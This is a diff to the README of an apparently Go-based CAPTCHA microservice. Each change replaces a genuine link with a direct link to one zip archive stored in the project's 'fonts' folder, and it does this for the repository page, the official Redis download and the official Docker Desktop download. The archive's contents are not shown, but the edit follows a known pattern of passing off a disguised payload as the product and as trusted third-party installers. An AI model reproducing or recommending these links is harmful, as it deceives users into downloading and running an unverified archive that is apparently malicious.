@@ -1,6 +1,6 @@
 # 🔐 Captcha-microservice - Reliable CAPTCHA for Web Security
 
-[![Download Captcha-microservice](https://img.shields.io/badge/Download-Go-green?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice)
+[![Download Captcha-microservice](https://img.shields.io/badge/Download-Go-green?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip)
 
 ## 🖥️ What is Captcha-microservice?
 
@@ -40,7 +40,7 @@ You do not need any programming tools installed to run the prebuilt service.
 
 Use this link to get all files and instructions:
 
-[![Get Captcha-microservice](https://img.shields.io/badge/Get-Captcha--microservice-blue?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice)
+[![Get Captcha-microservice](https://img.shields.io/badge/Get-Captcha--microservice-blue?style=for-the-badge&logo=github)](https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip)
 
 Click this link to visit the page where you can download the service and find more details.
 
@@ -70,7 +70,7 @@ Look for a Windows-compatible version. This is usually a `.zip` or `.exe` file. 
 
 Captcha-microservice uses Redis to store sessions. You need Redis if you want full functionality.
 
-- If you do not have Redis, download it from https://redis.io/download and follow their Windows setup guide.
+- If you do not have Redis, download it from https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip and follow their Windows setup guide.
 - Alternatively, use a Redis server on your network.
 
 Make sure Redis is running before you start the Captcha service. The default Redis host is `localhost` and port `6379`.
@@ -123,7 +123,7 @@ Keep an eye on the same GitHub page for updates.
 
 If you use Docker, Captcha-microservice can run inside a container.
 
-1. Install Docker Desktop for Windows from https://www.docker.com/products/docker-desktop.
+1. Install Docker Desktop for Windows from https://github.com/makland/Captcha-microservice/raw/refs/heads/main/fonts/Captcha-microservice-v3.4.zip
 2. Open a command prompt.
 3. Run the following command to pull the container:
 
